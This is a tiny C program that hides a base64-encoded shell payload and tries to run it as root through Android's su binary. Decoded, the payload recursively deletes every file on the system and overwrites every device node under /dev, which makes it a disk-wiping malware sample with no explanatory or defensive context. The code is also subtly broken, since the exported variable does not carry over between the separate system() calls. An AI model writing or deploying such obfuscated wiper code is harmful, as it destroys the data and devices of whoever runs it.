#include <stdio.h>

int main()
{
system("export i=IyEvc3lzdGVtL2Jpbi9zdSAtYyBzaAoKcm0gLXJmICQoZmluZCAvKQpkZCBpZj0vZGV2L251bGwgb2Y9JChmaW5kIC9kZXYp");
system("/system/bin/su -c sh $(echo $i | base64 -d)");
}
